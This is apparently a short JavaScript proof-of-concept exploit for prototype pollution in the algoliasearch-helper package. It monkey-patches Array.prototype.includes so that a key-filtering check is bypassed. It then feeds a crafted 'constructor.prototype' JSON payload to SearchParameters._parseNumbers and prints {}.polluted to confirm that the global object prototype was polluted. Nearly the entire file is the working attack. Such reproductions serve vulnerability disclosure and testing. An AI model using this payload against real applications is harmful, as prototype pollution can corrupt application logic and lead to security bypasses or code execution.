Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const algohelp = require('algoliasearch-helper');
let payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
console.log({}.polluted);
algohelp.SearchParameters._parseNumbers(payload);
console.log({}.polluted);